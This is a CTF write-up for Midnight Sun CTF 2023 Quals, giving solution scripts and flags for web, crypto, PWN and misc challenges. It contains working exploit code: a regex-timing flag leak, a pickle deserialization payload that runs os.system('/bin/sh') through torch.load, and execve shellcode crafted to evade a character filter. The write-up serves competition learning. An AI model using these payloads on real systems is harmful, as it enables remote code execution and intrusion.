# Midnight Sun CTF 2023 Quals
###### tags: `CTF`

## web
### matchmaker

time based leaking flag

```python
import requests
import string
from tqdm import tqdm

charset = string.ascii_letters + string.digits + "{}_'!,="

url = "http://matchmaker-2.play.hfsc.tf:12345/?x="

flag = "midnight{"

for i in tqdm(range(30)):
    stats = [0 for _ in range(len(charset))]
    for c in charset:
        res = requests.get(f"{url}^{flag}{c}{'(.*)'*2000}$")
        time = float(res.text.split("</strong>")[1].split("<br />")[0])
        stats[charset.index(c)] = time

    maxi = -1
    max = -1
    for i,s in enumerate(stats):
        if(s > max):
            max = s
            maxi = i
    flag += charset[maxi]
    print(flag)
    if(flag[-1] == '}'):
        break
```

`midnight{r3gExpErt153_1n_m47Chm4K1ng}`

## Crypto
### fact check

use IDA to reverse this golang binary

found weird string `s0me0ne_sh0u1d_f4cT_cH3ck_tH3s3_AIs`

`midnight{s0me0ne_sh0u1d_f4cT_cH3ck_tH3s3_AIs}`

### Mt. Random

the char of the flag is used as the seed of random generator

the generator will generator the number between `min` ~ `max` and will prevent the number inside the range `gap_start` ~ `gap_end - 1`. All the params is unknown

we can requests many times and make a statistics, than we will find the param as follow:

```
$min = 1;
$max = 256;
$gap_start = 100;
$gap_end = 150;
```

statistics script:

```python
import requests
from tqdm import tqdm

stats = [0 for _ in range(260)]

for i in tqdm(range(20)):
    res = requests.get("http://mtrandom-1.play.hfsc.tf:51237/?generate_samples=1")
    data = res.json()["samples"]
    for d in data:
        stats[d] += 1

for i,s in enumerate(stats):
    print(i, s)
```

first, we can find the common seed by scanning range 0 ~ 10000. Then we can scan each char one-by-one in the range 0x30 ~ 0x80

```php
<?php
function non_continuous_sample($min, $max, $gap_start, $gap_end) {
    $rand_num = mt_rand($min, $max - ($gap_end - $gap_start));
    if ($rand_num >= $gap_start) {
        $rand_num += ($gap_end - $gap_start);
    }
    return $rand_num;
}

$min = 1;
$max = 256;
$gap_start = 100;
$gap_end = 150;

$flag = "midnight{";
$flagnum = [];
foreach (str_split($flag) as $char) {
    $flagnum[] = ord($char);
}

// $sample = [241,3,36,165,3,89,96,170,199,241,174,165,36,82,170,96,160,82,89,97,2,51];
$sample = [15,84,189,77,84,39,218,38,253,15,170,77,189,219,38,218,55,219,39,186,33,74];
for ($seed=0; $seed < 10000; $seed++) { 
    # code...
    $i = 0;
    for (; $i < count($flagnum); $i++) {
        # code...
        mt_srand($seed + $flagnum[$i]);
        if(non_continuous_sample($min, $max, $gap_start, $gap_end) != $sample[$i])
        {
            break;
        }
    }
    if($i == count($flagnum))
    {
        echo $seed . "\n";
        for($ct=count($flagnum); $ct < count($sample); $ct++)
        {
            for($num=48; $num<128; $num++)
            {
                mt_srand($seed + $num);
                if(non_continuous_sample($min, $max, $gap_start, $gap_end) == $sample[$ct])
                {
                    $flag .= chr($num);
                    echo $flag . "\n";
                    break;
                }
            }
        }
        break;
    }
}

?>
```

`midnight{m1nd_th3_g4p}`

## PWN
### MemeControl

it use torch.load to load pytorch model

in the [documentation](https://pytorch.org/docs/stable/generated/torch.load.html#torch.load), it will use pickle as the default packer to unpack, so pickle deserialization vulnerability may existed

exploit generate script:

```python
import os
import pickle
import base64

class RCE:
    def __reduce__(self):
        return os.system, ("/bin/sh",)

pk = pickle.dumps(RCE())
# pickle.loads(pk)

print(base64.b64encode(pk))
```

`midnight{backd00r5_ar3_c00l_wh3n_th3Y_ar3_yoUR5}`

## speed
### SPD A

input shellcode, but cannot has `/`, `\x00`, `sh`, `bin`

it can bypass `sh`, `bin` by `or` and `shift`

for `/`, it can bypass by `ord(/) - 1` and `inc`

shellcode:
```
payload = asm("xor rax, rax")
payload += asm("mov al, 0x3b")
payload += asm("xor rbx, rbx")
payload += asm(f"mov bl, {hex(ord('h'))}")
payload += asm("shl rbx, 8")
payload += asm(f"or rbx, {hex(ord('s'))}")
payload += asm("shl rbx, 8")
payload += asm(f"or rbx, {hex(ord('/') - 1 )}")
payload += asm(f"inc rbx")
payload += asm("shl rbx, 8")
payload += asm(f"or rbx, {hex(ord('n'))}")
payload += asm("shl rbx, 8")
payload += asm(f"or rbx, {hex(ord('i'))}")
payload += asm("shl rbx, 8")
payload += asm(f"or rbx, {hex(ord('b'))}")
payload += asm("shl rbx, 8")
payload += asm(f"or rbx, {hex(ord('/') - 1 )}")
payload += asm(f"inc rbx")
payload += asm("push rbx")
payload += asm("mov rdi, rsp")
payload += asm("xor rsi, rsi")
payload += asm("xor rdx, rdx")
payload += asm("syscall")
```

`midnight{344b789f412e8b19618a1449a50622dd}`

## Misc
### sanity

copy and paste

`midnight{Ar3_U_Sm4rt3r_Then_AI?}`

### whistle

gcode

https://ncviewer.com/

following the route, deleting some `redacted` word

`midnight{router_hacking?}`